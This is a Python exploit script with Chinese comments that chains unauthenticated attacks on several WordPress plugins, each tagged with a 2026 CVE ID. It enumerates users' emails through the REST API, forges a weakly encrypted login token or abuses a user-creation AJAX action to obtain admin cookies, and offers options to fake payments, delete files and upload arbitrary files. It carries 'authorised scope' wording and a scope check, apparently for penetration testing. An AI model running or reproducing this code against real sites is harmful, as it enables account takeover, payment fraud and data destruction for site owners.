#!/usr/bin/env python3
"""WordPress 2026-08-15 窗插件未认证面（授权范围内）。

默认打到 L2：REST 枚用户 → 弱 AES / 6Storage 种 cookie → /wp-admin/ 可进。
假付、删文件、上传是子命令，授权内直接跑。不改原超管密码。
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import json
import re
import sys
from pathlib import Path
from typing import Any
from urllib.parse import urljoin, urlparse

try:
    import requests

    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-wp-plugin-unauth"

PLUGIN_READMES = (
    ("ussync", "/wp-content/plugins/user-session-synchronizer/readme.txt"),
    ("6storage", "/wp-content/plugins/6storage-rentals/readme.txt"),
    ("rapisafe", "/wp-content/plugins/rapisafe-multi-file-cf7/readme.txt"),
    ("maxupload", "/wp-content/plugins/maxupload-upload-larger-files-easily/readme.txt"),
    ("booking-calendar", "/wp-content/plugins/booking-calendar/readme.txt"),
    ("pinpoint", "/wp-content/plugins/booking-system/readme.txt"),
    ("sforce", "/wp-content/plugins/object-sync-for-salesforce/readme.txt"),
)

SIX_EMAIL_FIELDS = (
    "email",
    "user_email",
    "Email",
    "userEmail",
    "six_storage_email",
    "txtEmail",
)

RAPISAFE_ACTIONS = (
    "rsmfcf7_remove_upload",
    "rsmfcf7_remove_file",
    "rapisafe_remove_upload",
    "handleAjaxRemoveUpload",
)

MAXUPLOAD_ACTIONS = (
    "maxu82up_upload",
    "maxupload_resumable",
    "wpb_upload",
    "bfu_upload",
)


def _require_scope(url: str) -> str:
    host = host_of(url)
    if host and not in_scope(host):
        print(f"[!] 不在 scope：{host}", file=sys.stderr)
        sys.exit(2)
    return url.rstrip("/")


def _sess() -> requests.Session:
    s = requests.Session()
    s.verify = False
    s.headers["User-Agent"] = UA
    s.verify = False
    return s


def aes256_cbc_b64(plaintext: bytes, key: bytes, iv: bytes) -> str:
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad

        ct = AES.new(key, AES.MODE_CBC, iv).encrypt(pad(plaintext, 16))
        return base64.b64encode(ct).decode()
    except ImportError:
        pass
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding as sympad

    padder = sympad.PKCS7(128).padder()
    data = padder.update(plaintext) + padder.finalize()
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    ct = enc.update(data) + enc.finalize()
    return base64.b64encode(ct).decode()


def ussync_ref(email: str) -> str:
    """PHP openssl_encrypt AES-256-CBC, key=md5(''), IV=md5('another-secret')[:16]."""
    key = hashlib.md5(b"").hexdigest().encode()
    iv = hashlib.md5(b"another-secret").hexdigest()[:16].encode()
    return aes256_cbc_b64(email.encode(), key, iv)


def _stable_tag(text: str) -> str:
    m = re.search(r"(?i)Stable tag:\s*([0-9][0-9.]*)", text or "")
    return m.group(1) if m else ""


def _logged_in(resp: requests.Response | None) -> bool:
    if resp is None:
        return False
    cookies = " ".join(f"{k}={v}" for k, v in resp.cookies.items()).lower()
    setc = (resp.headers.get("Set-Cookie") or "").lower()
    if "wordpress_logged_in" in cookies or "wordpress_logged_in" in setc:
        return True
    url = (resp.url or "").lower()
    body = (resp.text or "")[:8000].lower()
    if "wp-login.php" in url:
        return False
    if resp.status_code == 200 and ("wp-admin-bar" in body or "dashboard" in body):
        return True
    return False


def recon(base: str, sess: requests.Session) -> dict[str, Any]:
    hits: dict[str, Any] = {}
    for name, path in PLUGIN_READMES:
        r = sess.get(urljoin(base + "/", path.lstrip("/")), timeout=12)
        if r.status_code == 200 and "stable tag" in (r.text or "").lower():
            hits[name] = {"path": path, "stable": _stable_tag(r.text), "len": len(r.text)}
    return hits


def enum_emails(base: str, sess: requests.Session, extra: list[str]) -> list[str]:
    host = (urlparse(base).hostname or "").lower()
    root = ".".join(host.split(".")[-2:]) if host.count(".") >= 1 else host
    out: list[str] = []
    seen: set[str] = set()

    def add(e: str) -> None:
        e = (e or "").strip().lower()
        if e and "@" in e and e not in seen:
            seen.add(e)
            out.append(e)

    for e in extra:
        add(e)
    for local in ("admin", "administrator", "webmaster", "info", "support"):
        if host:
            add(f"{local}@{host}")
        if root and root != host:
            add(f"{local}@{root}")
    try:
        r = sess.get(urljoin(base + "/", "/wp-json/wp/v2/users?per_page=100"), timeout=12)
        if r.status_code == 200:
            data = r.json()
            if isinstance(data, list):
                for u in data:
                    if not isinstance(u, dict):
                        continue
                    add(str(u.get("email") or ""))
                    slug = str(u.get("slug") or u.get("name") or "").replace(" ", "")
                    if slug and host:
                        add(f"{slug}@{host}")
                        add(f"{slug}@{root}")
    except Exception:
        pass
    try:
        home = sess.get(base + "/", timeout=12)
        for m in re.findall(r"mailto:([^\"'?\\s>]+)", home.text or "", re.I):
            add(m)
    except Exception:
        pass
    return out


def ato_ussync(base: str, sess: requests.Session, email: str) -> dict[str, Any]:
    ref = ussync_ref(email)
    r = sess.get(
        base + "/",
        params={"ussync-key": "x", "ussync-token": "1", "ussync-ref": ref},
        timeout=15,
        allow_redirects=True,
    )
    admin = sess.get(urljoin(base + "/", "wp-admin/"), timeout=15, allow_redirects=True)
    ok = _logged_in(r) or _logged_in(admin)
    return {
        "cve": "CVE-2026-15341",
        "email": email,
        "ok": ok,
        "home": r.status_code,
        "admin": admin.status_code,
        "admin_url": admin.url,
    }


def ato_six(base: str, sess: requests.Session, email: str) -> dict[str, Any]:
    ajax = urljoin(base + "/", "wp-admin/admin-ajax.php")
    last: requests.Response | None = None
    for field in SIX_EMAIL_FIELDS:
        last = sess.post(
            ajax,
            data={"action": "six_storage_create_wp_user", field: email},
            timeout=15,
        )
        if _logged_in(last):
            break
    admin = sess.get(urljoin(base + "/", "wp-admin/"), timeout=15, allow_redirects=True)
    ok = _logged_in(last) or _logged_in(admin)
    return {
        "cve": "CVE-2026-15303",
        "email": email,
        "ok": ok,
        "ajax": last.status_code if last is not None else None,
        "admin": admin.status_code,
        "admin_url": admin.url,
    }


def pay_pinpoint(base: str, sess: requests.Session, price: str) -> dict[str, Any]:
    ajax = urljoin(base + "/", "wp-admin/admin-ajax.php")
    cart = json.dumps({"price_total": price, "price": price})
    r = sess.post(
        ajax,
        data={"action": "dopbsp_woocommerce_add_to_cart", "cart_data": cart},
        timeout=15,
    )
    return {
        "cve": "CVE-2026-12128",
        "status": r.status_code,
        "body": (r.text or "")[:500],
        "ok": r.status_code == 200 and "error" not in (r.text or "").lower()[:80],
    }


def pay_booking(base: str, sess: requests.Session, reservation_id: str) -> dict[str, Any]:
    ajax = urljoin(base + "/", "wp-admin/admin-ajax.php")
    attempts = []
    for action, extra in (
        ("wpdevart_booking_ajax", {"task": "pay", "id": reservation_id, "status": "paid"}),
        ("booking_calendar", {"task": "update_payment", "id": reservation_id, "payment_status": "paid"}),
        ("wpda_reserv", {"reserv_id": reservation_id, "payment_status": "completed"}),
    ):
        r = sess.post(ajax, data={"action": action, **extra}, timeout=15)
        attempts.append({"action": action, "status": r.status_code, "body": (r.text or "")[:200]})
        if r.status_code == 200 and (r.text or "").strip() not in {"0", "-1", ""}:
            return {"cve": "CVE-2026-8840", "ok": True, "hit": attempts[-1], "attempts": attempts}
    return {"cve": "CVE-2026-8840", "ok": False, "attempts": attempts}


def rapisafe_nonce(html: str) -> str:
    m = re.search(r"RSMFCF7Vars\s*=\s*\{[^}]*nonce\"?\s*:\s*\"([^\"]+)\"", html or "")
    if m:
        return m.group(1)
    m = re.search(r"\"nonce\"\s*:\s*\"([a-f0-9]{8,})\"", html or "", re.I)
    return m.group(1) if m else ""


def delete_file(base: str, sess: requests.Session, path: str, nonce: str) -> dict[str, Any]:
    ajax = urljoin(base + "/", "wp-admin/admin-ajax.php")
    attempts = []
    for action in RAPISAFE_ACTIONS:
        r = sess.post(
            ajax,
            data={"action": action, "nonce": nonce, "_ajax_nonce": nonce, "file": path, "filename": path},
            timeout=15,
        )
        attempts.append({"action": action, "status": r.status_code, "body": (r.text or "")[:200]})
        if r.status_code == 200 and (r.text or "").strip() not in {"0", "-1", ""}:
            return {"cve": "CVE-2026-14484", "ok": True, "path": path, "hit": attempts[-1], "attempts": attempts}
    return {"cve": "CVE-2026-14484", "ok": False, "path": path, "attempts": attempts}


def upload_file(base: str, sess: requests.Session, file_path: Path) -> dict[str, Any]:
    ajax = urljoin(base + "/", "wp-admin/admin-ajax.php")
    name = file_path.name
    raw = file_path.read_bytes()
    attempts = []
    for action in MAXUPLOAD_ACTIONS:
        files = {"file": (name, raw)}
        data = {
            "action": action,
            "resumableFilename": name,
            "resumableChunkNumber": "1",
            "resumableTotalChunks": "1",
            "resumableIdentifier": "1",
        }
        r = sess.post(ajax, data=data, files=files, timeout=30)
        attempts.append({"action": action, "status": r.status_code, "body": (r.text or "")[:200]})
        if r.status_code == 200 and (r.text or "").strip() not in {"0", "-1", ""}:
            return {"cve": "CVE-2026-15965", "ok": True, "name": name, "hit": attempts[-1], "attempts": attempts}
    return {"cve": "CVE-2026-15965", "ok": False, "name": name, "attempts": attempts}


def cmd_chain(args: argparse.Namespace) -> int:
    base = _require_scope(args.url)
    sess = _sess()
    plugins = recon(base, sess)
    emails = enum_emails(base, sess, list(args.email or []))
    report: dict[str, Any] = {
        "target": base,
        "plugins": plugins,
        "emails": emails,
        "ato": [],
        "pay": None,
        "delete": None,
        "upload": None,
    }
    print(f"[*] plugins={list(plugins)}")
    print(f"[*] emails={emails[:8]}{'…' if len(emails) > 8 else ''}")

    if "ussync" in plugins:
        for em in emails:
            row = ato_ussync(base, sess, em)
            report["ato"].append(row)
            print(f"  ussync {em} ok={row['ok']} admin={row['admin']}")
            if row["ok"]:
                break
    if "6storage" in plugins and not any(x.get("ok") for x in report["ato"]):
        for em in emails:
            row = ato_six(base, sess, em)
            report["ato"].append(row)
            print(f"  6storage {em} ok={row['ok']} admin={row['admin']}")
            if row["ok"]:
                break

    if args.price:
        report["pay"] = pay_pinpoint(base, sess, args.price)
        print(f"  pinpoint price={args.price} ok={report['pay'].get('ok')}")
    if args.reservation:
        report["pay"] = pay_booking(base, sess, args.reservation)
        print(f"  booking reserv={args.reservation} ok={report['pay'].get('ok')}")

    if args.delete:
        home = sess.get(base + "/", timeout=12)
        nonce = rapisafe_nonce(home.text or "")
        report["delete"] = delete_file(base, sess, args.delete, nonce)
        print(f"  delete {args.delete} nonce={bool(nonce)} ok={report['delete'].get('ok')}")
    if args.upload:
        report["upload"] = upload_file(base, sess, Path(args.upload))
        print(f"  upload {args.upload} ok={report['upload'].get('ok')}")

    out = write_probe_json(
        report, case=args.case, out=None, case_subdir="1day", filename="wp_plugin_unauth.json"
    )
    ok = any(x.get("ok") for x in report["ato"]) or any(
        (report[k] or {}).get("ok") for k in ("pay", "delete", "upload") if report.get(k)
    )
    print(json.dumps({"ok": ok, "out": str(out), "plugins": list(plugins)}, ensure_ascii=False))
    return 0 if plugins or ok else 1


def main() -> int:
    ap = argparse.ArgumentParser(description="WP 2026-08-15 插件未认证 L2（授权内）")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--case", default="")
    ap.add_argument("--email", action="append", default=[], help="可重复；默认再猜 admin@host + REST 用户")
    ap.add_argument("--price", default="", help="CVE-2026-12128 cart_data.price_total")
    ap.add_argument("--reservation", default="", help="CVE-2026-8840 预约单 id")
    ap.add_argument("--delete", default="", help="CVE-2026-14484 删除路径")
    ap.add_argument("--upload", default="", help="CVE-2026-15965 本地文件路径")
    args = ap.parse_args()
    return cmd_chain(args)


if __name__ == "__main__":
    raise SystemExit(main())
